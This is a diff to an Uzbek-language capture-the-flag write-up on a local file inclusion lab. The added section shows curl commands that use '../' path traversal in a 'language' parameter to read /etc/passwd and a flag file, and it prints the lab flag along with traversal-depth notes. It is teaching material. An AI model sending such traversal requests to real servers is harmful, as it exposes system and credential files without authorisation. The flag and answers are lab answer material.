@@ -101,6 +101,22 @@ curl -s "http://154.57.164.76:31038/index.php?language=../../../../etc/passwd" \
 Saytdagi "Write your answer" maydoniga **`barry`** deb yozib **Submit** qilinadi
 (kichik harflar bilan, bo'sh joysiz).
 
+## 5.1 2-savol — `/usr/share/flags/flag.txt`
+
+```bash
+curl -s "http://154.57.164.76:31038/index.php?language=../../../../usr/share/flags/flag.txt"
+```
+
+Natija:
+
+```
+HTB{n3v3r_tru$t_u$3r_!nput}
+```
+
+> Traversal chuqurligi: 3 ta `../` yetmaydi (cwd = `/var/www/html`), 4 tadan boshlab
+> fayl o'qiladi, 5-6 ham ishlaydi (`/` dan yuqoriga chiqib bo'lmaydi, ortiqcha `../`
+> e'tiborsiz qoladi).
+
 ## 6. Keyingi qadamlar (shu lab davom etsa)
 
 LFI topilgach odatda shular sinaladi:
